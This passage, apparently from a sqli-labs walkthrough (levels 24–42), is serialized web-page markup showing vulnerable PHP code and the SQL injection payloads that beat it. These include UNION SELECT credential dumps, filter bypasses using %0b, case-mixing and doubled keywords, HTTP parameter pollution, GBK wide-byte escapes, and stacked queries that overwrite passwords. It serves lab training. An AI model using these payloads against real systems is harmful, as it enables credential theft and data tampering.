mysql_real_escape_string($_POST['password']);\n$re_pass = mysql_real_escape_string($_POST['re_password']);\nif($pass==$re_pass) {\n    $sql = \"UPDATE users SET password='$pass' WHERE username='$username' AND password='$curr_pass'\";\n    // ...\n}\n"}]]}],["$","pre",null,{"style":{"background":"linear-gradient(180deg, transparent 24px, var(--bg-transparent-golden) 24px 48px, transparent 48px, transparent 144px, var(--bg-transparent-golden) 144px 168px, transparent 168px)"},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$22"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":""}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Plain Text"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"current_password    xxx\npassword            123\nre_password         123\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"current_password    xxx\npassword            123\nre_password         123\n"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"SQL"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"SQL"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"UPDATE users SET password='123' WHERE username='admin' #' AND password='xxx'"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token keyword\">UPDATE</span> users <span class=\"token keyword\">SET</span> password<span class=\"token operator\">=</span><span class=\"token string\">'123'</span> <span class=\"token keyword\">WHERE</span> username<span class=\"token operator\">=</span><span class=\"token string\">'admin'</span> <span class=\"token comment\">#' AND password='xxx'</span>"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">admin</code><code class=\"x-inline-highlight\">123</code>"}}],["$","$L10",null,{"src":"L24-2.jpg"}],["$","h3",null,{"className":"x-h2","children":"L25"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">or</code><code class=\"x-inline-highlight\">and</code><code class=\"x-inline-highlight\">||</code><code class=\"x-inline-highlight\">&&</code><code class=\"x-inline-highlight\">password</code><code class=\"x-inline-highlight\">or</code><code class=\"x-inline-highlight\">passwoorrd</code>"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"payload = \"?id=x' UNION SELECT 0,group_concat(username),group_concat(passwoorrd) FROM security.users -- \""}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"payload <span class=\"token operator\">=</span> <span class=\"token string\">\"?id=x' UNION SELECT 0,group_concat(username),group_concat(passwoorrd) FROM security.users -- \"</span>"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"L25a"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"payload = \"?id=99 UNION SELECT 0,group_concat(username),group_concat(passwoorrd) FROM security.users -- \""}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"payload <span class=\"token operator\">=</span> <span class=\"token string\">\"?id=99 UNION SELECT 0,group_concat(username),group_concat(passwoorrd) FROM security.users -- \"</span>"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"L26"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"PHP"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"function blacklist($id)\n{\n    $id = preg_replace('/or/i', \"\", $id);       // strip out OR (non case sensitive)\n    $id = preg_replace('/and/i', \"\", $id);      // Strip out AND (non case sensitive)\n    $id = preg_replace('/[\\/\\*]/', \"\", $id);    // strip out /*\n    $id = preg_replace('/[--]/', \"\", $id);      // Strip out --\n    $id = preg_replace('/[#]/', \"\", $id);       // Strip out #\n    $id = preg_replace('/[\\s]/', \"\", $id);      // Strip out spaces\n    $id = preg_replace('/[\\/\\\\\\\\]/', \"\", $id);  // Strip out slashes\n    return $id;\n}\n$id = $_GET['id'];\n$id = blacklist($id);\n$sql = \"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$23"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">or</code>PHP 5.3.29Windows<code class=\"x-inline-highlight\">preg_match</code><code class=\"x-inline-highlight\">\\s</code><code class=\"x-inline-highlight\">\\x0B (Vertical Tab)</code>"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"payload = \"?id=x' UNION SELECT 0,group_concat(username),group_concat(passwoorrd) FROM security.users WHERE '1'='1\"\npayload = payload.replace(\" \", \"%0b\")\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"payload <span class=\"token operator\">=</span> <span class=\"token string\">\"?id=x' UNION SELECT 0,group_concat(username),group_concat(passwoorrd) FROM security.users WHERE '1'='1\"</span>\npayload <span class=\"token operator\">=</span> payload<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">\" \"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"%0b\"</span><span class=\"token punctuation\">)</span>\n"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"L26a"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"payload = \"?id=x') UNION SELECT 0,group_concat(username),group_concat(passwoorrd) FROM security.users WHERE ('1'='1\"\npayload = payload.replace(\" \", \"%0b\")\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"payload <span class=\"token operator\">=</span> <span class=\"token string\">\"?id=x') UNION SELECT 0,group_concat(username),group_concat(passwoorrd) FROM security.users WHERE ('1'='1\"</span>\npayload <span class=\"token operator\">=</span> payload<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">\" \"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"%0b\"</span><span class=\"token punctuation\">)</span>\n"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"L27"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":""}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"PHP"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"function blacklist($id)\n{\n    $id = preg_replace('/[\\/\\*]/', \"\", $id);   // Strip out /*\n    $id = preg_replace('/[--]/', \"\", $id);     // Strip out --.\n    $id = preg_replace('/[#]/', \"\", $id);      // Strip out #.\n    $id = preg_replace('/[ +]/', \"\", $id);     // Strip out spaces.\n    $id = preg_replace('/union/s', \"\", $id);   // Strip out union\n    $id = preg_replace('/select/s', \"\", $id);  // Strip out select\n    $id = preg_replace('/UNION/s', \"\", $id);   // Strip out UNION\n    $id = preg_replace('/SELECT/s', \"\", $id);  // Strip out SELECT\n    $id = preg_replace('/Union/s', \"\", $id);   // Strip out Union\n    $id = preg_replace('/Select/s', \"\", $id);  // Strip out select\n    return $id;\n}\n$id = $_GET['id'];\n$id = blacklist($id);\n$sql = \"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$24"}}]}]]}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"payload = \"?id=x' UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users WHERE '1'='1\"\npayload = payload.replace(\" \", \"%0b\")\npayload = payload.replace(\"UNION\", \"UNiON\")\npayload = payload.replace(\"SELECT\", \"SEleCT\")\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$25"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"L27a"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"payload = '?id=x\" UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users WHERE \"1\"=\"1'\npayload = payload.replace(\" \", \"%0b\")\npayload = payload.replace(\"UNION\", \"UNiON\")\npayload = payload.replace(\"SELECT\", \"SEleCT\")\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$26"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"L28"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">%0b</code><code class=\"x-inline-highlight\">\\s</code>"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"PHP"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"function blacklist($id)\n{\n    $id = preg_replace('/[\\/\\*]/', \"\", $id);           //strip out /*\n    $id = preg_replace('/[--]/', \"\", $id);             //Strip out --.\n    $id = preg_replace('/[#]/', \"\", $id);              //Strip out #.\n    $id = preg_replace('/[ +]/', \"\", $id);             //Strip out spaces.\n    $id = preg_replace('/union\\s+select/i', \"\", $id);  //Strip out UNION & SELECT.\n    return $id;\n}\n$id = $_GET['id'];\n$id = blacklist($id);\n$sql = \"SELECT * FROM users WHERE id=('$id') LIMIT 0,1\";\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$27"}}]}]]}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"payload = \"?id=x') UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users WHERE ('1'='1\"\npayload = payload.replace(\" \", \"%0b\")\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"payload <span class=\"token operator\">=</span> <span class=\"token string\">\"?id=x') UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users WHERE ('1'='1\"</span>\npayload <span class=\"token operator\">=</span> payload<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">\" \"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"%0b\"</span><span class=\"token punctuation\">)</span>\n"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"L28a"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"L28"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"PHP"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$$id = preg_replace('/union\\s+select/i', \"\", $id);"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token variable\">$id</span> <span class=\"token operator\">=</span> <span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/union\\s+select/i'</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":""}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"payload = \"?id=x') UNION UNION SELECT SELECT 0,group_concat(username),group_concat(password) FROM security.users WHERE ('1'='1\""}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"payload <span class=\"token operator\">=</span> <span class=\"token string\">\"?id=x') UNION UNION SELECT SELECT 0,group_concat(username),group_concat(password) FROM security.users WHERE ('1'='1\"</span>"}}]}]]}],["$","h2",null,{"className":"x-h1","children":"WAFL29-L31"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"Lab"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"HPP<code class=\"x-inline-highlight\">(HTTP Parameter Pollution)</code>"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"PHP"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"<?php\n\n// WAF implementation with a whitelist approach, only allows input to be numeric.\nfunction whitelist($input)\n{\n    $match = preg_match(\"/^\\d+$/\", $input);\n    if ($match) {\n        // ... input is valid\n    } else {\n        // ... input is invalid\n        header(\"Location: hacked.php\");\n    }\n}\n\n// The function below immitates the behavior of parameters when subject to HPP (HTTP Parameter Pollution).\nfunction java_implementation($query_string)\n{\n    $q_s = $query_string;\n    $qs_array = explode(\"&\", $q_s);\n    foreach ($qs_array as $key => $value) {\n        $val = substr($value, 0, 2);\n        if ($val == \"id\") {\n            $id_value = substr($value, 3, 30);\n            return $id_value;\n            echo \"<br>\";\n            break;\n        }\n    }\n}\n\n// ...\n\n$qs = $_SERVER[\"QUERY_STRING\"];\n$id1 = java_implementation($qs);\nwhitelist($id1);\n\n$id = $_GET[\"id\"];\n$sql = \"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\n$result = mysql_query($sql);\n?>\n"}]]}],["$","pre",null,{"style":{"background":"linear-gradient(180deg, transparent 816px, var(--bg-transparent-golden) 816px 864px, transparent 864px, transparent 888px, var(--bg-transparent-golden) 888px 936px, transparent 936px)"},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$28"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">java_implementation</code>WAF<code class=\"x-inline-highlight\">?id=1&id=2</code>WAF<code class=\"x-inline-highlight\">1</code><code class=\"x-inline-highlight\">2</code>SQL"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"Lab<code class=\"x-inline-highlight\">payload</code>"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"payload = \"?id=1&id=x' UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users -- \""}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"payload <span class=\"token operator\">=</span> <span class=\"token string\">\"?id=1&amp;id=x' UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users -- \"</span>"}}]}]]}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"payload = '?id=1&id=x\" UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users -- '"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"payload <span class=\"token operator\">=</span> <span class=\"token string\">'?id=1&amp;id=x\" UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users -- '</span>"}}]}]]}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"payload = '?id=1&id=x\") UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users -- '"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"payload <span class=\"token operator\">=</span> <span class=\"token string\">'?id=1&amp;id=x\") UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users -- '</span>"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"Lab<code class=\"x-inline-highlight\">login.php</code>"}}],["$","h2",null,{"className":"x-h1","children":"L32-L37"}],["$","h3",null,{"className":"x-h2","children":" & "}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"GBK"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"L32-L37"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"PHP"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"mysql_query(\"SET NAMES gbk\");"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"SET NAMES gbk\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">'</code><code class=\"x-inline-highlight\">&#92;</code><code class=\"x-inline-highlight\">%df%27</code>"}}],["$","div",null,{"className":"x-table-wrapper","children":["$","table",null,{"className":"x-table","children":["$","tbody",null,{"children":[["$","tr",null,{"children":[["$","th",null,{}],["$","th",null,{"children":"Byte 1"}],["$","th",null,{"children":"Byte 2"}],["$","th",null,{"children":"Byte 3"}]]}],["$","tr",null,{"children":[["$","td",null,{"children":""}],["$","td",null,{"children":["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">0xdf</code>"}}]}],["$","td",null,{"children":["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">0x27</code> (<code class=\"x-inline-highlight\">'</code>)"}}]}],["$","td",null,{}]]}],["$","tr",null,{"children":[["$","td",null,{"children":""}],["$","td",null,{"children":["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">0xdf</code>"}}]}],["$","td",null,{"children":["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">0x5c</code> (<code class=\"x-inline-highlight\">&#92;</code>)"}}]}],["$","td",null,{"children":["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">0x27</code> (<code class=\"x-inline-highlight\">'</code>)"}}]}]]}],["$","tr",null,{"children":[["$","td",null,{"children":"SQL"}],["$","td",null,{"colSpan":2,"children":["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">0xdf5c</code> (<code class=\"x-inline-highlight\"></code>)"}}]}],["$","td",null,{"children":["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">0x27</code> (<code class=\"x-inline-highlight\">'</code>)"}}]}]]}]]}]}]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"GBK<code class=\"x-inline-highlight\">0xdf</code><code class=\"x-inline-highlight\">0x5c</code><code class=\"x-inline-highlight\"></code><code class=\"x-inline-highlight\">&#92;</code>"}}],["$","$L10",null,{"src":"gbk1.jpg","filterDarkTheme":true}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">%df</code>GBK"}}],["$","$L10",null,{"src":"gbk2.jpg","filterDarkTheme":true}],["$","h3",null,{"className":"x-h2","children":"L32L33L36"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">preg_replace</code><code class=\"x-inline-highlight\">addslashes</code><code class=\"x-inline-highlight\">mysql_real_escape_string</code>"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"payload = \"?id=%df' UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users -- \""}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"payload <span class=\"token operator\">=</span> <span class=\"token string\">\"?id=%df' UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users -- \"</span>"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"L34L37"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">addslashes</code><code class=\"x-inline-highlight\">mysql_real_escape_string</code>"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"payload = \"%df' OR 1=1 -- \"\nresp = query_post(\n    \"Less-34\", # \"Less-37\"\n    data=f\"uname={payload}&passwd=x\",\n    headers={\"Content-Type\": \"application/x-www-form-urlencoded\"}\n)\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"payload <span class=\"token operator\">=</span> <span class=\"token string\">\"%df' OR 1=1 -- \"</span>\nresp <span class=\"token operator\">=</span> query_post<span class=\"token punctuation\">(</span>\n    <span class=\"token string\">\"Less-34\"</span><span class=\"token punctuation\">,</span> <span class=\"token comment\"># \"Less-37\"</span>\n    data<span class=\"token operator\">=</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"uname=</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>payload<span class=\"token punctuation\">}</span></span><span class=\"token string\">&amp;passwd=x\"</span></span><span class=\"token punctuation\">,</span>\n    headers<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token string\">\"Content-Type\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"application/x-www-form-urlencoded\"</span><span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">)</span>\n"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"L35"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"PHP"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$$sql = \"SELECT * FROM users WHERE id=$id LIMIT 0,1\";"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT * FROM users WHERE id=<span class=\"token interpolation\"><span class=\"token variable\">$id</span></span> LIMIT 0,1\"</span><span class=\"token punctuation\">;</span>"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">id</code>"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"payload = \"?id=99 UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users -- \""}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"payload <span class=\"token operator\">=</span> <span class=\"token string\">\"?id=99 UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users -- \"</span>"}}]}]]}],["$","h2",null,{"className":"x-h1","children":"L38-L45"}],["$","h3",null,{"className":"x-h2","children":" & "}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"LabSQL<code class=\"x-inline-highlight\">mysql_query($sql);</code>SQL"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"SQL<code class=\"x-inline-highlight\">;</code><code class=\"x-inline-highlight\">mysqli_multi_query</code>"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"PHP"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"PHP"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"<?php\nmysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);\n$link = mysqli_connect(\"localhost\", \"my_user\", \"my_password\", \"world\");\n\n$query = \"SELECT CURRENT_USER();\";\n$query .= \"SELECT Name FROM City ORDER BY ID LIMIT 20, 5\";\n\n/* execute multi query */\nmysqli_multi_query($link, $query);\ndo {\n    /* store the result set in PHP */\n    if ($result = mysqli_store_result($link)) {\n        while ($row = mysqli_fetch_row($result)) {\n            printf(\"%s\\n\", $row[0]);\n        }\n    }\n    /* print divider */\n    if (mysqli_more_results($link)) {\n        printf(\"-----------------\\n\");\n    }\n} while (mysqli_next_result($link));\n?>\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$29"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"SQL"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"Lab<code class=\"x-inline-highlight\">Dumb</code><code class=\"x-inline-highlight\">id=1</code>SQL"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"SQL"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"UPDATE security.users SET password='hacked' WHERE id='1';"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token keyword\">UPDATE</span> security<span class=\"token punctuation\">.</span>users <span class=\"token keyword\">SET</span> password<span class=\"token operator\">=</span><span class=\"token string\">'hacked'</span> <span class=\"token keyword\">WHERE</span> id<span class=\"token operator\">=</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">;</span>"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"L38-L41"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"Lab"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"payload = \"?id=1';  UPDATE security.users SET password='hacked-L38' WHERE id='1'; -- \"\npayload = \"?id=1;   UPDATE security.users SET password='hacked-L39' WHERE id='1'; -- \"\npayload = \"?id=1'); UPDATE security.users SET password='hacked-L40' WHERE id='1'; -- \"\npayload = \"?id=1;   UPDATE security.users SET password='hacked-L41' WHERE id='1'; -- \"\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"payload <span class=\"token operator\">=</span> <span class=\"token string\">\"?id=1';  UPDATE security.users SET password='hacked-L38' WHERE id='1'; -- \"</span>\npayload <span class=\"token operator\">=</span> <span class=\"token string\">\"?id=1;   UPDATE security.users SET password='hacked-L39' WHERE id='1'; -- \"</span>\npayload <span class=\"token operator\">=</span> <span class=\"token string\">\"?id=1'); UPDATE security.users SET password='hacked-L40' WHERE id='1'; -- \"</span>\npayload <span class=\"token operator\">=</span> <span class=\"token string\">\"?id=1;   UPDATE security.users SET password='hacked-L41' WHERE id='1'; -- \"</span>\n"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"L42-L45"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"L44L45L42L43"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"payload = \"x'; UPDATE security.users SET password='hacked-L42' WHERE id='1'; -- \"\nresp = query_post(\"Less-42/login.php\", data={\"login_user\": \"x\", \"login_password\": payload})\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"payload <span class=\"token operator\">=</span> <span class=\"token string\">\"x'; UPDATE security.users SET password='hacked-L42' WHERE id='1'; -- \"</span>\nresp <span class=\"token operator\">=</span> query_post<span class=\"token punctuation\">(</span><span class=\"token string\">\"Less-42/login.php\"</span><span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token string\">\"login_user\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"x\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"login_password\"</span><span class=\"token punctuation\">:</span> payload<span class=\"token punctuation\">}</span><span class=\"token 